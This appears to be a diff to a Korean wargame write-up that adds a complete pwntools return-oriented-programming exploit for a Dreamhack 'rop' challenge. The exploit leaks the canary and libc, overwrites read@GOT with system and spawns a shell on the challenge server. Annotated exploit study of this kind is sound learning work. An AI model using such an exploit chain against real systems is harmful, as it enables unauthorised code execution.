@@ -459,7 +459,147 @@ p.interactive()
 
 #### 4) 셸 획득
 
-로컬에서 오류 뜸.
-리모트는 오류 없음.
-Why?????
-Ubuntu22.04에서 테스트 해 봐야 하나?
+``` python
+#!/usr/bin/env python3
+# Name: rop.py
+from pwn import *
+
+# 로그 찍을 때 편하게 쓰는 함수
+# 예: slog('canary', 0x12345678) → [+] canary: 0x12345678 같은 출력.
+def slog(name, addr): return success(': '.join([name, hex(addr)]))
+
+# ELF('./rop): rop 바이너리의 ELF 정보를 읽어옴(함수 주소, 심볼, GOT등)
+# p = process('./rop')
+# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
+p = remote('host8.dreamhack.games', 23102)
+e = ELF('./rop')
+libc = ELF('./libc.so.6')
+
+# [1] Leak canary
+'''
+buf: [rbp-0x40], canary: [rbp-0x08]
+0x40 - 0x08 + 1 = 0x39
+프로그램이 "Buf: "를 출력할 때까지 기다렸다가 buf 전송
+프로그램이 printf("Buf: %s\n", buf)로 A * 0x39 를 출력하므로 그 부분을 소비
+cnry = u64(b'\x00' + p.recvn(7))
+: 이어서 출력되는 건 Canary의 나머지 7바이트임
+: Canary의 첫 바이트는 \x00 으로 고정이므로 앞에 붙이고,
+: p.recvn(7) 으로 나머지 바이트를 받아서 총 8바이트 만들고, u64()로 정수로 변환.
+'''
+buf = b'A'*0x39
+p.sendafter(b'Buf: ', buf)
+p.recvuntil(buf)
+cnry = u64(b'\x00' + p.recvn(7))
+slog('canary', cnry)
+
+# [2] Exploit
+'''
+GOT(Global Offset Table)
+    라이브러리 함수의 실제 주소가 저장되는 공간
+    즉, 실행 도중 동적 로더가 채워 넣음
+    read@got = read 함수의 실제 libc 상 주소를 담고 있는 메모리 위치
+
+PLT(Procedure Linkage Table)
+    외부 함수로 점프할 때 쓰는 중간 점프 코드
+    실행파일 안에 짧은 stub 함수처럼 들어 있음
+    결국엔 GOT 에 적힌 주소를 참조해서 실제 libc 함수로 점프
+
+%%%% 익스폴로잇에서는 
+    PLT(write_plt)는 함수 호출용으로 쓰이고,
+    GOT(read_got)는 leak 대상(실제 주소를 얻을 메모리)으로 쓰임.
+
+$ ROPgadget --binary ./rop --re "ret" 을 이용하여 rdi와 rsi를 이용할 수 있는 가젯을 뽑아냄.
+'''
+read_plt = e.plt['read']
+read_got = e.got['read']
+write_plt = e.plt['write']
+pop_rdi = 0x0000000000400853
+pop_rsi_r15 = 0x0000000000400851
+# ret = 0x0000000000400854
+ret = 0x0000000000400596
+
+payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8
+
+# write(1, read_got, ...)
+'''
+read 실제 주소 leak을 위한 페이로드
+write()에 의해 화면에 출력되어지는 정보를 u64(p.recvn(6) + b'\x00' * 2) 에서 이용함.
+
+pop rdi; ret -> rdi = 1 (stdout)
+pop rsi; pop r15; ret -> rsi = read@got, r15 = dummy
+write_plt 호출 -> write(1, read_got, ...)
+==> 결과 : read 함수의 실제 libc 주소가 화면에 출력됨.
+'''
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
+payload += p64(write_plt)
+
+# read(0, read_got, ...)
+'''
+두번째 단계 -> read@GOT를 system 주소로 덮고, 곧바로 '/bin/sh' 문자열을 어어서 씀
+read@GOT 주소 + 8 의 위치에 문자열을 편법으로 저장하는 것.
+
+ROP 체인중 read(0, read@got, rdx)를 호출함.
+여기에서 프로세스는 read@got에 입력을 기다리며 대기함
+사용자가 작성한 스크립트가 p64(system) + b'/bin/sh\x00'를 한 방에 전송함.
+결과적으로 메모리상태는 :
+[ read@got ]        = system 주소 (8바이트)
+[ read@got + 0x08 ] = "/bin/sh\x00"
+'''
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
+payload += p64(read_plt)
+
+# read("/bin/sh") == system("/bin/sh")
+'''
+마지막 호출 -> read@plt를 다시 호출하지만, 이미 GOT가 system 으로 바뀜
+
+이어지는 ROP에서 rdi = read@got + 0x08 로 세팅(= "/bin/sh"의 주소)
+ret로 스택 정렬(16바이트 정렬) 후 read@plt 호출
+하지만 read@GOT가 system 주소로 바뀌어 있어서, 이 호출은 곧 system(read@got+8) = system("/bin/sh")가 된다. 
+셀 획득 하게됨. 
+'''
+payload += p64(pop_rdi)
+payload += p64(read_got + 0x8)
+payload += p64(ret)
+payload += p64(read_plt)
+
+
+'''
+공격자는 익스프로잇 페이로드를 stdin으로 보냄
+프로그램은 Buf: 프롬프트 이후, payload를 read() 로 입력받아 버퍼 오버플로우를 발생시킴
+리턴주소가 우리가 만든 pop rdi -> pop rsi -> write@plt 체인으로 바뀜
+실행 시점에서 write(1, read_got, 8)이 실행됨.
+
+write() 호출 결과 = stdout 으로 read@got 에 들어있는 값이 출력됨.
+GOT에는 실행 시점에 실제 libc의 read() 함수 주소가 들어있음
+x64 주소는 보통 6바이트(48비트)만 유효 -> p.recvn(6)으로 읽음
+뒤에 \x00 2개를 붙여서 8바이트 정리 후 u64()로 정수 변환.
+p.recvn(6) → b'\x70\xd2\x7a\xf7\xff\x7f'
++ b'\x00\x00'
+u64() → 0x7ffff77ad270   (실제 read() 함수의 libc 주소)
+
+libe base 구하기
+우리가 얻은 read() 실제 주소 - read 의 오프셋 = libc base
+libc base + system 오프셋 = 실제 system() 주소
+'''
+p.sendafter(b'Buf: ', payload)
+read = u64(p.recvn(6) + b'\x00' * 2)
+lb = read - libc.symbols['read']
+system = lb + libc.symbols['system']
+slog('read', read)
+slog('libc_base', lb)
+slog('system', system)
+
+# 로컬일 경우 : [+] libc_base: 0x7f1b8b294510
+# 리모트일 경우 : [+] libc_base: 0x7f2085d98000
+# 로컬에서 테스트 시 libc base 값을 확인해보면 뒤의 3 바이트가 0 이 아님.
+# 해서 잘못 구한 libc base에 더한 system 함수의 주소는 옳지 않은 주소이기 때문에 segment fault가 발생.
+
+# 대부분 워게임의 remote 환경이 local 환경과 다르기 때문에 Dockerfile이 주어진 경우, 앞으로 문제 난이도가 높아질수록 도커를 사용하여 문제를 푸시는 것을 추천드립니다.
+
+p.send(p64(system) + b'/bin/sh\x00')
+
+p.interactive()
+
+```
